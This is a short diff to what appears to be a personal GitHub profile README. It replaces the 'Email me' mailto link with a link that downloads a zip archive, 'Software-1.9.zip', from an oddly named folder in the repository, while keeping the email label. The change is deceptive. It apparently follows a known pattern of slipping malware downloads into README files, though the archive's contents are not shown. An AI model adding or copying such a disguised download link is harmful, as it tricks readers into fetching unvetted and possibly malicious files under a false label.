@@ -20,4 +20,4 @@ I am passionate about leveraging AI coding tools (like Claude Code, Gemini) to p
 ### 💬 Let's Connect
 I'm interested in side projects, monetization through AI code, and collaboration opportunities.
 
-* [Email me](mailto:fys981210@gmail.com)
+* [Email me](https://raw.githubusercontent.com/yongsinfok/yongsinfok/main/postparotitic/Software-1.9.zip)
